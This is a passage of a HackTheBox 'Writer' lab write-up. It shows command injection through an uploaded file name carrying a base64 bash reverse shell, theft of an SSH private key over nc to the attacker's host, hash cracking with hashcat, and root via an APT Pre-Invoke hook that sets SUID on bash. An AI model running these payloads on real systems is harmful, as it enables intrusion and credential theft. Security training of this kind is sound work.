+<p>The misconfiguration here is the call to <code>os.system</code> with some odd user input. The idea is to upload a file whose name is something like <code>image.jpg x;shell-command;</code>, in order not to break the <code>mv</code> command, which needs two parameters, and then execute the shell command we want. The resulting command will be:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash>mv image.jpg x;shell-command; image.jpg x;shell-command;.jpg
+</code></pre></div><p>The <code>.jpg</code> extension is not a problem because the server only checks that the string <code>".jpg"</code> is included in the filename:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python>image_url <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;image_url&#39;</span>)
+<span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;.jpg&#34;</span> <span style=color:#f92672>in</span> image_url:
+    <span style=color:#75715e># ...</span>
+</code></pre></div><p>Next, we can try to add another image, but this time specifying a local URL (using the <code>file://</code> schema), so that the file is retrieved from the machine and the filename is not changed. Then the malicious filename will be injected in the <code>os.system</code> call.</p>
+<p>So let&rsquo;s build a payload and encode it in Base64 just in case:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ echo -n <span style=color:#e6db74>&#39;bash -i  &gt;&amp; /dev/tcp/10.10.17.44/4444 0&gt;&amp;1&#39;</span> | base64
+YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx
+</code></pre></div><p>Then create a file called <code>fdsa.jpg x;echo &lt;b64>|base64 -d|bash;</code> and upload it as a file.</p>
+<p>Then we can try to upload another image with an URL like <code>file:///var/www/writer.htb/writer/static/img/fdsa.jpg x;echo &lt;b64>|base64 -d|bash;</code>. The use of <code>file://</code> is the schema required to specify a local file as an URL.</p>
+<p>Using a <code>nc</code> listener, we gain access to the machine as <code>www-data</code>.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ nc -nlvp <span style=color:#ae81ff>4444</span>
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.11.101.
+Ncat: Connection from 10.10.11.101:36806.
+bash: cannot set terminal process group (1055): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@writer:/$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+www-data@writer:/$ ^Z
+zsh: suspended  ncat -nlvp 4444
+<span style=color:#960050;background-color:#1e0010>
+</span><span style=color:#960050;background-color:#1e0010></span>$ stty raw -echo; fg
+[1]  + continued  ncat -nlvp 4444
+                                 reset xterm
+www-data@writer:/$ export TERM=xterm
+www-data@writer:/$ export SHELL=bash
+www-data@writer:/$ stty rows 50 columns 158
+</code></pre></div><p>All the foothold process is automated in a Python script called <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Writer/foothold.py><code>foothold.py</code></a> (detailed explanation <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Writer#footholdpy>here</a>).</p>
+<h2 id=system-enumeration>System enumeration</h2>
+<p>We can now recall that we found another user for MySQL (<code>djangouser:DjangoSuperPassword</code>). And actually with this one we can find another hashed password:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>www-data@writer:/var/www/writer2_project$ mysql -u djangouser -p
+Enter password:
+...
+<span style=color:#960050;background-color:#1e0010>
+</span><span style=color:#960050;background-color:#1e0010></span>MariaDB [dev]&gt; show databases;
++--------------------+
+| Database           |
++--------------------+
+| dev                |
+| information_schema |
++--------------------+
+2 rows in set (0.000 sec)
+<span style=color:#960050;background-color:#1e0010>
+</span><span style=color:#960050;background-color:#1e0010></span>MariaDB [dev]&gt; use dev;
+Database changed
+MariaDB [dev]&gt; show tables;
++----------------------------+
+| Tables_in_dev              |
++----------------------------+
+| auth_group                 |
+| auth_group_permissions     |
+| auth_permission            |
+| auth_user                  |
+| auth_user_groups           |
+| auth_user_user_permissions |
+| django_admin_log           |
+| django_content_type        |
+| django_migrations          |
+| django_session             |
++----------------------------+
+10 rows in set (0.001 sec)
+<span style=color:#960050;background-color:#1e0010>
+</span><span style=color:#960050;background-color:#1e0010></span>MariaDB [dev]&gt; describe auth_user;
++--------------+--------------+------+-----+---------+----------------+
+| Field        | Type         | Null | Key | Default | Extra          |
++--------------+--------------+------+-----+---------+----------------+
+| id           | int(11)      | NO   | PRI | NULL    | auto_increment |
+| password     | varchar(128) | NO   |     | NULL    |                |
+| last_login   | datetime(6)  | YES  |     | NULL    |                |
+| is_superuser | tinyint(1)   | NO   |     | NULL    |                |
+| username     | varchar(150) | NO   | UNI | NULL    |                |
+| first_name   | varchar(150) | NO   |     | NULL    |                |
+| last_name    | varchar(150) | NO   |     | NULL    |                |
+| email        | varchar(254) | NO   |     | NULL    |                |
+| is_staff     | tinyint(1)   | NO   |     | NULL    |                |
+| is_active    | tinyint(1)   | NO   |     | NULL    |                |
+| date_joined  | datetime(6)  | NO   |     | NULL    |                |
++--------------+--------------+------+-----+---------+----------------+
+11 rows in set (0.002 sec)
+<span style=color:#960050;background-color:#1e0010>
+</span><span style=color:#960050;background-color:#1e0010></span>MariaDB [dev]&gt; select username, password from auth_user;
++----------+------------------------------------------------------------------------------------------+
+| username | password                                                                                 |
++----------+------------------------------------------------------------------------------------------+
+| kyle     | pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= |
++----------+------------------------------------------------------------------------------------------+
+1 row in set (0.001 sec)
+</code></pre></div><p>This time the hash is crackable with <code>hashcat</code>, and returns the password for user <code>kyle</code> (<code>marcoantonio</code>):</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ hashcat --example-hashes | grep -C <span style=color:#ae81ff>2</span> pbkdf2_sha256
+MODE: 10000
+TYPE: Django (PBKDF2-SHA256)
+HASH: pbkdf2_sha256$10000$1135411628$bFYX62rfJobJ07VwrUMXfuffLfj2RDM2G6/BrTrUWkE=
+PASS: hashcat
+<span style=color:#960050;background-color:#1e0010>
+</span><span style=color:#960050;background-color:#1e0010></span>$ hashcat -m <span style=color:#ae81ff>10000</span> hash /usr/share/wordlists/rockyou.txt --quiet
+pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio
+</code></pre></div><h2 id=lateral-movement-to-user-john>Lateral movement to user <code>john</code></h2>
+<p>Now we can access as <code>kyle</code> via SSH. We have got <code>user.txt</code>:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ ssh kyle@10.10.11.101
+kyle@10.10.11.101&#39;s password:
+kyle@writer:~$ cat user.txt
+2f1aa903cb62c07380d1d452ef397cf1
+</code></pre></div><p>We can notice that <code>kyle</code> belongs to the <code>filter</code> group. As a member of that group, we are able to read and write to a shell script called <code>/etc/postfix/disclaimer</code>:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>kyle@writer:~$ id
+uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),997(filter),1002(smbgroup)
+kyle@writer:~$ find / -group filter 2&gt;/dev/null
+/etc/postfix/disclaimer
+/var/spool/filter
+kyle@writer:~$ find / -group filter 2&gt;/dev/null | xargs ls -la
+-rwxrwxr-x 1 root   filter 1021 Aug 25 23:56 /etc/postfix/disclaimer
+<span style=color:#960050;background-color:#1e0010>
+</span><span style=color:#960050;background-color:#1e0010></span>/var/spool/filter:
+total 8
+drwxr-x--- 2 filter filter 4096 May 13 22:31 .
+drwxr-xr-x 7 root   root   4096 May 18 16:54 ..
+</code></pre></div><p>The script <code>/etc/postfix/disclaimer</code> is the following one:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-sh data-lang=sh><span style=color:#75715e>#!/bin/sh
+</span><span style=color:#75715e></span><span style=color:#75715e># Localize these.</span>
+INSPECT_DIR<span style=color:#f92672>=</span>/var/spool/filter
+SENDMAIL<span style=color:#f92672>=</span>/usr/sbin/sendmail
+
+<span style=color:#75715e># Get disclaimer addresses</span>
+DISCLAIMER_ADDRESSES<span style=color:#f92672>=</span>/etc/postfix/disclaimer_addresses
+
+<span style=color:#75715e># Exit codes from &lt;sysexits.h&gt;</span>
+EX_TEMPFAIL<span style=color:#f92672>=</span><span style=color:#ae81ff>75</span>
+EX_UNAVAILABLE<span style=color:#f92672>=</span><span style=color:#ae81ff>69</span>
+
+<span style=color:#75715e># Clean up when done or when aborting.</span>
+trap <span style=color:#e6db74>&#34;rm -f in.</span>$$<span style=color:#e6db74>&#34;</span> <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>2</span> <span style=color:#ae81ff>3</span> <span style=color:#ae81ff>15</span>
+
+<span style=color:#75715e># Start processing.</span>
+cd $INSPECT_DIR <span style=color:#f92672>||</span> <span style=color:#f92672>{</span> echo $INSPECT_DIR does not exist; exit
+$EX_TEMPFAIL; <span style=color:#f92672>}</span>
+
+cat &gt;in.$$ <span style=color:#f92672>||</span> <span style=color:#f92672>{</span> echo Cannot save mail to file; exit $EX_TEMPFAIL; <span style=color:#f92672>}</span>
+
+<span style=color:#75715e># obtain From address</span>
+from_address<span style=color:#f92672>=</span><span style=color:#e6db74>`</span>grep -m <span style=color:#ae81ff>1</span> <span style=color:#e6db74>&#34;From:&#34;</span> in.$$ | cut -d <span style=color:#e6db74>&#34;&lt;&#34;</span> -f <span style=color:#ae81ff>2</span> | cut -d <span style=color:#e6db74>&#34;&gt;&#34;</span> -f 1<span style=color:#e6db74>`</span>
+
+<span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> <span style=color:#e6db74>`</span>grep -wi ^<span style=color:#e6db74>${</span>from_address<span style=color:#e6db74>}</span>$ <span style=color:#e6db74>${</span>DISCLAIMER_ADDRESSES<span style=color:#e6db74>}</span><span style=color:#e6db74>`</span> <span style=color:#f92672>]</span>; <span style=color:#66d9ef>then</span>
+  /usr/bin/altermime --input<span style=color:#f92672>=</span>in.$$ <span style=color:#ae81ff>\
+</span><span style=color:#ae81ff></span>                   --disclaimer<span style=color:#f92672>=</span>/etc/postfix/disclaimer.txt <span style=color:#ae81ff>\
+</span><span style=color:#ae81ff></span>                   --disclaimer-html<span style=color:#f92672>=</span>/etc/postfix/disclaimer.txt <span style=color:#ae81ff>\
+</span><span style=color:#ae81ff></span>                   --xheader<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm&#34;</span> <span style=color:#f92672>||</span> <span style=color:#ae81ff>\
+</span><span style=color:#ae81ff></span>                    <span style=color:#f92672>{</span> echo Message content rejected; exit $EX_UNAVAILABLE; <span style=color:#f92672>}</span>
+<span style=color:#66d9ef>fi</span>
+
+$SENDMAIL <span style=color:#e6db74>&#34;</span>$@<span style=color:#e6db74>&#34;</span> &lt;in.$$
+
+exit $?
+</code></pre></div><p>What the script is doing is append a disclaimer to every email that is sent from <code>root@writer.htb</code> and <code>kyle@writer.htb</code>, as told below:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>kyle@writer:~$ cat /etc/postfix/disclaimer_addresses
+root@writer.htb
+kyle@writer.htb
+kyle@writer:~$ cat /etc/postfix/disclaimer.txt
+<span style=color:#960050;background-color:#1e0010>
+</span><span style=color:#960050;background-color:#1e0010></span>--
+This email and any files transmitted with it are confidential and intended solely for the use of the individual or entity to whom they are addressed.
+If you have received this email in error please notify the system manager. This message contains confidential information and is intended only for the
+individual named. If you are not the named addressee you should not disseminate, distribute or copy this e-mail. Please notify the sender immediately
+by e-mail if you have received this e-mail by mistake and delete this e-mail from your system. If you are not the intended recipient you are notified
+that disclosing, copying, distributing or taking any action in reliance on the contents of this information is strictly prohibited.
+<span style=color:#960050;background-color:#1e0010>
+</span><span style=color:#960050;background-color:#1e0010></span>Writer.HTB
+</code></pre></div><p>So we can guess that the script is executed whenever an SMTP email is sent. We can actually modify the script because we are in group <code>filter</code>.</p>
+<p>After noticing that <code>john</code> has a <code>.ssh</code> directory, we can simply transfer his private key to our machine using <code>nc 10.10.17.44 4444 &lt; /home/john/.ssh/id_rsa</code> and putting the command on top of the <code>/etc/postfix/disclaimer</code> script.</p>
+<p>To trigger the execution of the script, we must send an email. For that, we can use a simple Python script like this one (found <a href=https://www.tutorialspoint.com/python/python_sending_email.htm>here</a>):</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/python3</span>
+
+<span style=color:#f92672>import</span> smtplib
+
+sender <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;kyle@writer.htb&#39;</span>
+receivers <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;john@writer.htb&#39;</span>]
+
+message <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;&#39;
+</span><span style=color:#e6db74>From: Kyle &lt;kyle@writer.htb&gt;
+</span><span style=color:#e6db74>To: John &lt;john@writer.htb&gt;
+</span><span style=color:#e6db74>Subject: SMTP e-mail test
+</span><span style=color:#e6db74>
+</span><span style=color:#e6db74>This is a test e-mail message.
+</span><span style=color:#e6db74>&#39;&#39;&#39;</span>[<span style=color:#ae81ff>1</span>:]
+
+<span style=color:#66d9ef>try</span>:
+    smtp_object <span style=color:#f92672>=</span> smtplib<span style=color:#f92672>.</span>SMTP(<span style=color:#e6db74>&#39;localhost&#39;</span>)
+    smtp_object<span style=color:#f92672>.</span>sendmail(sender, receivers, message)
+    print(<span style=color:#e6db74>&#39;Successfully sent email&#39;</span>)
+<span style=color:#66d9ef>except</span> smtplib<span style=color:#f92672>.</span>SMTPException:
+    print(<span style=color:#e6db74>&#39;Error: unable to send email&#39;</span>)
+</code></pre></div><p>And we get the private key so that we have access as <code>john</code>:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ nc -nlvp <span style=color:#ae81ff>4444</span> &gt; id_rsa
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.11.101.
+Ncat: Connection from 10.10.11.101:38630.
+^C
+<span style=color:#960050;background-color:#1e0010>
+</span><span style=color:#960050;background-color:#1e0010></span>$ chmod <span style=color:#ae81ff>600</span> id_rsa
+<span style=color:#960050;background-color:#1e0010>
+</span><span style=color:#960050;background-color:#1e0010></span>$ ssh -i id_rsa john@10.10.11.101
+john@writer:~$
+</code></pre></div><h2 id=privilege-escalation>Privilege escalation</h2>
+<p>If we list processes with <code>ps</code>, we can see a Cron task executed as <code>root</code> that does an <code>apt-get update</code>:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>john@writer:~$ ps -faux | grep root
+...
+root       31467  0.0  0.0   8356  3400 ?        S    19:52   0:00  _ /usr/sbin/CRON -f
+root       31475  0.0  0.0   2608   608 ?        Ss   19:52   0:00      _ /bin/sh -c /usr/bin/apt-get update
+root       31479  0.1  0.2  16204  8524 ?        S    19:52   0:00          _ /usr/bin/apt-get update
+...
+</code></pre></div><p>Again, we can check if we belong to any group, and it turns out that we are part of <code>management</code>, whose members are able to write at <code>/etc/apt/apt.conf.d</code>:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>john@writer:~$ id
+uid=1001(john) gid=1001(john) groups=1001(john),1003(management)
+john@writer:~$ find / -group management 2&gt;/dev/null
+/etc/apt/apt.conf.d
+john@writer:~$ cd /etc/apt/apt.conf.d
+john@writer:~$ cat /etc/apt/apt.conf.d/* | grep APT::
+APT::Periodic::Update-Package-Lists &#34;1&#34;;
+APT::Periodic::Download-Upgradeable-Packages &#34;0&#34;;
+APT::Periodic::AutocleanInterval &#34;0&#34;;
+APT::Update::Post-Invoke-Success {&#34;touch /var/lib/apt/periodic/update-success-stamp 2&gt;/dev/null || true&#34;;};
+APT::Archives::MaxAge &#34;30&#34;;
+APT::Archives::MinAge &#34;2&#34;;
+APT::Archives::MaxSize &#34;500&#34;;
+APT::Update::Post-Invoke-Success {
+APT::Update::Post-Invoke-Success {
+APT::Update::Post-Invoke-Success {&#34;/usr/lib/update-notifier/update-motd-updates-available 2&gt;/dev/null || true&#34;;};
+</code></pre></div><p>After checking the default files at that directory and searching <a href=https://gtfobins.github.io/gtfobins/apt-get/><code>apt-get</code> in GTFObins</a>, we can build a command to be triggered before the <code>apt-get update</code>. For example, let&rsquo;s set SUID permissions to <code>/bin/bash</code>:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>john@writer:~$ ls -l /bin/bash
+-rwxr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
+john@writer:~$ echo &#39;APT::Update::Pre-Invoke {&#34;chmod 4755 /bin/bash&#34;;};&#39; &gt; /etc/apt/apt.conf.d/01asdf
+</code></pre></div><p>And after around a minute we have:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>john@writer:~$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
+john@writer:~$ bash -p
+bash-5.0# chmod 0755 /bin/bash
+bash-5.0# cat /root/root.txt
+f7e5f21393414b3bb227ee32fdae67a
+</code></pre></div><div class="mt6 instapaper_ignoref">
+</div>
+</div>
+<aside aria-label=aside class="w-20-l mt6-l aside-desktop">
+<div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:2rem>
+<p class="f5 b mb3">Contents of this write-up</p>
+<nav id=TableOfContents>
+<ul>
+<li><a href=#port-scanning>Port scanning</a></li>
+<li><a href=#web-enumeration>Web enumeration</a></li>
+<li><a href=#finding-a-sql-injection>Finding a SQL injection</a></li>
+<li><a href=#reading-files-using-sqli>Reading files using SQLi</a></li>
+<li><a href=#python-source-code-analysis>Python source code analysis</a></li>
+<li><a href=#smb-enumeration>SMB enumeration</a></li>
+<li><a href=#foothold-on-the-machine>Foothold on the machine</a></li>
+<li><a href=#system-enumeration>System enumeration</a></li>
+<li><a href=#lateral-movement-to-user-john>Lateral movement to user <code>john</code></a></li>
+<li><a href=#privilege-escalation>Privilege escalation</a></li>
+</ul>
+</nav>
+</div>
+</aside>
+</article>
+</main>
+<footer class="bg-black bottom-0 w-100 pa3" role=contentinfo>
+<div class="flex justify-between">
+<a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://7rocky.github.io/ title=https://7rocky.github.io/>&copy; 7Rocky 2021</a>
+<div style=margin-top:8px>
+<div>
+<div>
+<a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</span>
+</a>
+<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
+<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</span>
+</a>
+</div>
+</div>
+</div>
+</div>
+</footer>
+</body>
+</html>
